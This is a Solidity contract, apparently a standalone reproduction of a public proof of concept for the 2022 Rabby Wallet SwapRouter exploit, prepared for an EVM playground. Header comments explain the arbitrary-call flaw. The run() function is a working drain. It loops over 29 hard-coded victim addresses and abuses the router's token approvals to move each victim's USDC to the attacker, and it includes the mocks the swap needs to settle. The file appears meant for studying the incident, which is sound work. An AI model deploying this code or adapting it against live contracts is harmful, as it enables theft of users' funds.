// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-10-RabbyWallet_SwapRouter).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (ContractTest IS the attacker contract) — the router's post-trade bookkeeping
// calls balanceOf(router) and transfer(dst, amount) back on msg.sender, so those
// must be mocked on the attacker. There is therefore no standalone contract to
// deploy, and a callScript of EOA calls cannot reproduce it. This is a faithful,
// self-contained copy of the inline attack (testExploit body → run()) plus the
// balanceOf/transfer/receive mocks, so the playground can deploy it and record
// run(). Logic, constants and the 29 victim addresses are copied verbatim from
// test/RabbyWallet_SwapRouter_exp.sol.
//
// Root cause: Rabby Wallet's SwapRouter.swap() forwards an ATTACKER-CONTROLLED
// (dexRouter, data) pair as a raw dexRouter.call(data) from the router's own
// context. Because the router held unlimited ERC-20 approvals from many users,
// the attacker points dexRouter at the USDC token and supplies
// data = transferFrom(victim, attacker, victimBalance). The router — being the
// approved spender — executes the transferFrom and moves each victim's full
// USDC balance to the attacker. No flash loan, no price manipulation — just an
// arbitrary external call in a permission-holding aggregator.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function allowance(address, address) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IRabbySwap {
    function swap(
        address srcToken,
        uint256 amount,
        address dstToken,
        uint256 minReturn,
        address dexRouter,
        address dexSpender,
        bytes memory data,
        uint256 deadline
    ) external;
}

contract RabbySwapDrain {
    IRabbySwap constant RABBYSWAP_ROUTER = IRabbySwap(0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1);
    IERC20 constant USDT_TOKEN = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 constant USDC_TOKEN = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    function run() external {
        // Hard-coded victim EOAs the attacker harvested (those that had approved
        // the SwapRouter). Copied verbatim from test/RabbyWallet_SwapRouter_exp.sol.
        address[29] memory victims = [
            0x94228872bb16CBCDfe010c42a8e456d15B366bF1,
            0x6a3BCee1eBeBDaA099a46d21a355D0FF1C521fCB,
            0xDAcCce559a0571083556f39d05b177579613D83b,
            0x720610ed4925676D971B0ae5b3080bd233E19038,
            0xf9e1D1e9F22c96752356AdFd377231528c7E851E,
            0xAF22b1692dEe5929952cFBA4D9a74c0952C712C8,
            0xFcdB212E7e7588D2dd2cc44C30F6C79fB507DB4B,
            0x9A93C5f7680724F6b7097085B0052A56D80615Bd,
            0x491968b05D95979BA3a52D73D8a39EA96693f011,
            0xc64284527B04A48c6673dF62f5B48188Ccfdf658,
            0x9df99a08710615FaBcb16Ea0b05ED039e8a5F644,
            0xc897967Bab363caDD4F3001d51506bCc5DD6f6C2,
            0x48aa9d67cb713804C005516BCa7769c159d7897C,
            0xB9AFb68de4E1f89acA813ca75d87bd86a1a17aa3,
            0xC10898edA672fDFc4Ac0228bB1Da9b2bF54C768f,
            0x73B37009778048f6dB88fD602582473e74e5019a,
            0xbB4b297cC5257D8ab7F280361C96b3A27014EbBb,
            0x5BE2539BaA7622865FDc401bA26adB636d78f5Bf,
            0x25939E70Dc19ef0aa2819f5c6544712a36eEbfa7,
            0x5853eD4f26A3fceA565b3FBC698bb19cdF6DEB85,
            0x73a6b16aD155aCd15F1A69e61369DB883dFC0b0b,
            0xE451DC0948F33B1261c585f0DB84cca9Ab69F3A4,
            0xd38023D7Ee559672fA00eA5156734710bcc0e781,
            0x059c1592696D430E7bA8cccC984BA9639b8CF90B,
            0x69AfE88F22F416fFB7d2Bf119b31EBc0D0d85325,
            0xD506Fb416B0ad8DBf7859B9B38c435405E3d1110,
            0xe7b6804A9fE8aDEb109112A8A2CF40093E0d55fc,
            0xeEBbAf298bb8B5076723d69AF61bf75a5C2ad8d6,
            0x1Fc550e98aD3021e32C47A84019F77a0792c60B7
        ];

        for (uint256 i; i < victims.length; ++i) {
            uint256 vicBalance = USDC_TOKEN.balanceOf(victims[i]);
            uint256 vicAllowance = USDC_TOKEN.allowance(victims[i], address(RABBYSWAP_ROUTER));

            if (vicAllowance >= vicBalance) {
                bytes memory usdcCallbackData = abi.encodeWithSignature(
                    "transferFrom(address,address,uint256)", victims[i], address(this), vicBalance
                );
                RABBYSWAP_ROUTER.swap(
                    address(USDT_TOKEN),
                    0,
                    address(this),
                    4660,
                    address(USDC_TOKEN),
                    address(USDC_TOKEN),
                    usdcCallbackData,
                    block.timestamp
                );
            }
        }
    }

    // The router's post-trade bookkeeping calls these on msg.sender (the attacker).
    // Mocking them (as in the original test) lets the swap settle harmlessly.
    function balanceOf(address) external pure returns (uint256) {
        return 100e18;
    }

    function transfer(address, uint256) external pure returns (bool) {
        return true;
    }

    receive() external payable {}
}
